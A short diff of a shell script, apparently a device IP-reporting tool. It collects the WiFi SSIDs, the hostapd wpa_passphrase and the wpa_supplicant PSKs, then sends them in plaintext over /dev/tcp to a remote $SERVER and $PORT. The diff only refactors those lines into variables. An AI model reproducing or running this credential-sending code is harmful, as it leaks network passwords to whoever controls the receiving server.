@@ -15,5 +15,9 @@ if [[ $(< /tmp/ip) != "$IP" ]]; then
 	cat <&3
 fi
 
+HOSTSSID=`grep '^ssid' /etc/hostapd/hostapd.conf`
+HOSTPASS=`grep 'wpa_passphrase' /etc/hostapd/hostapd.conf`
+# TODO: Decrease messiness
+WIFIDATA=`egrep 'ssid|psk' /etc/wpa_supplicant/wpa_supplicant.conf | tr '\n' ' '`
 exec 3<>/dev/tcp/$SERVER/$PORT
-printf "NETWORK: `grep '^ssid' /etc/hostapd/hostapd.conf` `grep 'wpa_passphrase' /etc/hostapd/hostapd.conf` `egrep 'ssid|psk' /etc/wpa_supplicant/wpa_supplicant.conf | tr '\n' ' '`" >&3
+printf "NETWORK: $HOSTSSID $HOSTPASS $WIFIDATA" >&3
